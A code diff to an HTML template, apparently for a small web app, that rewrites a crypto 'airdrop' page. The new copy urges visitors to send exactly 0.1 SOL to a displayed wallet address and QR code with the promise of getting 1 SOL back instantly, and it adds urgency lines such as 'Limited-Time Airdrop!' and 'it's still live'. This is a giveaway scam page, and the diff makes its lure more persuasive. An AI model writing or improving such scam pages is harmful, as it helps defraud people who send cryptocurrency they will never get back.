@@ -54,9 +54,16 @@ HTML_TEMPLATE = """
   </style>
 </head>
 <body>
-  <h1>🎁 Claim 1 SOL</h1>
-  <p>Send exactly <strong>0.1 SOL</strong> to:</p>
-  <p><code>{{ wallet }}</code></p>
+  <body>
+  <h1>🎁 Claim 1 SOL – Be Fast!</h1>
+  <div class="highlight-box">
+    <p>🚨 <strong>Limited-Time Airdrop!</strong></p>
+    <p>Send exactly <strong>0.1 SOL</strong> to the wallet below, and get back <strong>1 SOL</strong> instantly.</p>
+    <p>Why? We're testing our reward bot — and first users win big! 🧠✨</p>
+    <p>💡 _If you're seeing this, it's still live. Don't miss it._</p>
+    <p><strong>Wallet Address:</strong><br><code>{{ wallet }}</code></p>
+  </div>
+
   <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />
 
   <div>
